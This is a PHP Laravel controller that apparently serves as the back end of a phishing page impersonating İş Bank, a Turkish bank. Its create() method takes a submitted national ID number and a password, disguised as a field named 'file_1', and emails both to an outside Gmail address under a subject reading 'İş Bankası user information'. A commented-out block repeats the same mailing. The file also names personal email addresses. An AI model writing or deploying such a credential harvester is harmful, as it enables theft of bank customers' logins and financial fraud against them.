<?php


namespace App\Http\Controllers;
use Illuminate\Http\Request;
use Mail;

class ControlPanel extends Controller
{
    public function create(Request $request) //
    {
        if ($request->isMethod('post')) {
            $user_id = $request->input('kimlik');
            $secreenshot = $request->input('file_1');

            $message_content = 'Kullanıcı kimlik numarası: ' . $user_id . ' ' . 'Kullanıcı parolası: ' . $secreenshot;
            Mail::raw($message_content, function ($message) {
                $message->to('rabia.287084@gmail.com', 'Sistem mesajı')->subject('İş Bankası Kullanıcı Bilgileri');
                $message->from('layikrumeysa@gmail.com');
            });
            return redirect('/home')->with('success', 'Mail gönderme işlemi başarılı!');
        } else {
            return view('mail');
        }
    }

    public function home(Request $request)
    {
        return view('welcome');
    }


} /* public function send()
     {
         Mail :: send (['text'=>'mail'],['name', 'İş bankası Sistem'], function($message){

             $message-> to('rabia.287084@gmail.com')->subject('İş Bankası Kullanıcı Bilgileri');
             $message->from('layikrumeysa@gmail.com');
         });}

         public function getMail()
     {
          return view('mail');
     }
         public function postMail(Request $request)
         {
          $this->validate(request);
         }

 */